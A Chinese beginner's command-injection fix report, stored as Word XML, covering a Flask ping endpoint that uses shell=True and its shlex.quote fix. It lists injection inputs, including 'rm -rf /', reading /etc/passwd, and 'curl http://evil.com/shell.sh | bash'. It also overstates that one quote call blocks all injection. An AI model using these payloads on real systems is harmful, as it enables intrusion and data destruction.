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命令注入漏洞修复报告</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="4472C4"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>从"一个 Ping 工具变成任意命令执行"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用户信息管理平台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命令注入（Command Injection）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严重（可直接执行系统命令）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修复日期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2026-07-16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编写视角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初学者安全学习笔记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第一章：什么是命令注入？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>第二章：我们项目里的命令注入漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">    2.1 问题代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">    2.2 为什么 shell=True 这么危险</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>第三章：漏洞演示 —— 一个 Ping 工具变成万能钥匙</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">    3.1 正常使用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">    3.2 命令注入：执行任意命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>第四章：漏洞修复 —— 我们用 shlex.quote()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">    4.1 什么是 shlex.quote()？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">    4.2 修复前后代码对比</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>第五章：修复验证</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>第六章：总结与心得</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第一章：什么是命令注入？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>命令注入（Command Injection）是我目前遇到的最危险的漏洞之一。为什么说它危险？因为一旦存在命令注入，攻击者就可以在服务器上执行任何系统命令。不是"查看你的数据"，而是"完全控制你的服务器"。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>用一个故事理解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>假设你开了一家餐厅，厨房里有一个传菜窗口。正常情况下，服务员通过窗口喊"一份番茄炒蛋"，厨师就做一份。但如果服务员喊的是"一份番茄炒蛋，顺便帮我把隔壁餐厅的菜单偷来"，而厨师居然照做了——这就是命令注入。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>在我们的项目里，Ping 功能就是那个"传菜窗口"。用户提交一个 IP 地址，服务器执行 ping 命令。但如果用户提交的是 8.8.8.8; whoami，服务器就会先 ping 8.8.8.8，然后执行 whoami。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>命令注入需要的 3 个条件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. 调用系统命令</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — 程序需要执行外部命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. 使用 shell=True</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — 通过系统 Shell 执行，支持管道、分号等特殊字符</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. 用户输入未过滤</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — 输入直接拼接到命令中</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第二章：我们项目里的命令注入漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 问题代码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@app.route("/ping", methods=["GET", "POST"])</w:t>
        <w:br/>
        <w:t>def ping():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ip = request.form.get("ip", "")   # 用户输入</w:t>
        <w:br/>
        <w:t xml:space="preserve">    command = f"ping -c 3 {ip}"       # f-string 拼接</w:t>
        <w:br/>
        <w:t xml:space="preserve">    result = subprocess.check_output(</w:t>
        <w:br/>
        <w:t xml:space="preserve">        command, shell=True, ...)      # shell=True 执行</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>这段代码的问题是一连串的：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>① f"ping -c 3 {ip}" — 用户输入的 ip 直接拼接到命令字符串里</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>② shell=True — 交给系统 Shell 执行，分号、管道符全部有效</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>③ 无过滤 — 没有检查用户输入的内容</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 为什么 shell=True 这么危险？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>subprocess 有两种执行方式：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>shell=False（安全）：直接执行命令，不允许特殊字符。比如 ping 8.8.8.8;whoami，会把 ";whoami" 当参数传给 ping。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>shell=True（危险）：交给系统的 /bin/sh 执行，;、|、&amp;&amp; 全部有效。8.8.8.8;whoami 会先执行 ping，再执行 whoami。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>f-string + shell=True + 无过滤 = 命令注入的完美配方。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第三章：漏洞演示 —— 一个 Ping 工具变成万能钥匙</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 正常使用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输入: 8.8.8.8</w:t>
        <w:br/>
        <w:t>实际执行: ping -c 3 8.8.8.8</w:t>
        <w:br/>
        <w:t>结果: 正常 Ping 通谷歌 DNS ✅</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 命令注入：执行任意命令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输入: 8.8.8.8; echo INJECTED; #</w:t>
        <w:br/>
        <w:t>实际执行: ping -c 3 8.8.8.8; echo INJECTED; #</w:t>
        <w:br/>
        <w:t xml:space="preserve">                    ↑ 分号拼接新命令!</w:t>
        <w:br/>
        <w:t>结果: ping 完后输出 INJECTED → 命令注入成功!</w:t>
        <w:br/>
        <w:br/>
        <w:t>输入: 127.0.0.1; whoami</w:t>
        <w:br/>
        <w:t>实际执行: ping -c 3 127.0.0.1; whoami</w:t>
        <w:br/>
        <w:t>结果: ping 完后显示当前用户身份</w:t>
        <w:br/>
        <w:br/>
        <w:t>输入: 8.8.8.8; cat /etc/passwd</w:t>
        <w:br/>
        <w:t>输入: 8.8.8.8; rm -rf /</w:t>
        <w:br/>
        <w:t>输入: 8.8.8.8; curl http://evil.com/shell.sh | bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CF1322"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>简单来说：攻击者能做的 = 服务器上能做的一切。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第四章：漏洞修复 —— 我们用 shlex.quote()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 什么是 shlex.quote()？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Python 标准库里的 shlex.quote() 函数，专门用来处理命令参数。它会给参数加上引号，同时转义内部的特殊字符，确保用户输入被当作"一个参数"而不是"多条命令"。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>举个例子：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ip = "8.8.8.8; whoami"</w:t>
        <w:br/>
        <w:t>safe_ip = shlex.quote(ip)</w:t>
        <w:br/>
        <w:t># safe_ip = '8.8.8.8; whoami'</w:t>
        <w:br/>
        <w:t># ← 整个字符串被单引号包裹，; 和空格都失去特殊含义</w:t>
        <w:br/>
        <w:br/>
        <w:t>command = f"ping -c 3 {safe_ip}"</w:t>
        <w:br/>
        <w:t># 实际执行: ping -c 3 '8.8.8.8; whoami'</w:t>
        <w:br/>
        <w:t># ping 会把 "8.8.8.8; whoami" 当成一个域名去解析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>加了 shlex.quote() 后，用户输入的任何特殊字符（;、|、&amp;&amp;、`、$）都变成了普通文本，不会影响命令结构。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 修复前后代码对比</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>修复前（有漏洞）：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ip = request.form.get("ip", "")</w:t>
        <w:br/>
        <w:t>command = f"ping -c 3 {ip}"           # ← 直接拼接</w:t>
        <w:br/>
        <w:t>result = subprocess.check_output(</w:t>
        <w:br/>
        <w:t xml:space="preserve">    command, shell=True, ...)          # ← shell=True</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>修复后（安全）：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import shlex                           # ← 新增导入</w:t>
        <w:br/>
        <w:br/>
        <w:t>ip = request.form.get("ip", "")</w:t>
        <w:br/>
        <w:t>safe_ip = shlex.quote(ip)              # ← 转义特殊字符</w:t>
        <w:br/>
        <w:t>command = f"ping -c 3 {safe_ip}"       # ← 拼接安全的参数</w:t>
        <w:br/>
        <w:t>result = subprocess.check_output(</w:t>
        <w:br/>
        <w:t xml:space="preserve">    command, shell=True, ...)           # ← shell=True 保留</w:t>
        <w:br/>
        <w:t># ↑ shlex.quote 让特殊字符变成普通文本</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>只需加一行 shlex.quote()，就能阻断所有命令注入攻击。特殊字符被自动转义，分号、管道符、与符号等都变成了参数的一部分，不会再被 Shell 解释执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第五章：修复验证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Ping 8.8.8.8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; whoami 注入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执行 whoami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Ping 失败提示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; echo INJECTED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输出 INJECTED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不输出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| cat /etc/passwd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读取密码文件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Ping 失败提示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</w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="008000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>✅ 所有命令注入尝试均被 shlex.quote() 拦截，正常 Ping 功能不受影响。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第六章：总结与心得</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>命令注入是我学 Web 安全以来见过"破坏力最大"的漏洞之一。一个 Ping 功能，因为没有过滤用户输入 + 用了 shell=True，就能让攻击者完全控制服务器。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>我学到的 3 件事</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1. shell=True 要非常谨慎使用。能用 shell=False 就不用 shell=True。如果必须要用，用户输入一定要用 shlex.quote() 处理。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2. f-string + 命令执行 = 高风险。每次写 f"命令 {用户输入}" 的时候，都要停下来想一想：这里会不会被注入？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3. shlex.quote() 是神器。一行代码就能防住所有命令注入，比写各种黑名单过滤靠谱得多。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>一句话记住</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>"执行系统命令时，用户输入必须用 shlex.quote() 包裹。"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>写命令 → 用 shlex.quote()</w:t>
        <w:br/>
        <w:t>shell=True → 必须 quote()</w:t>
        <w:br/>
        <w:t>不 quote → 等于留后门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4472C4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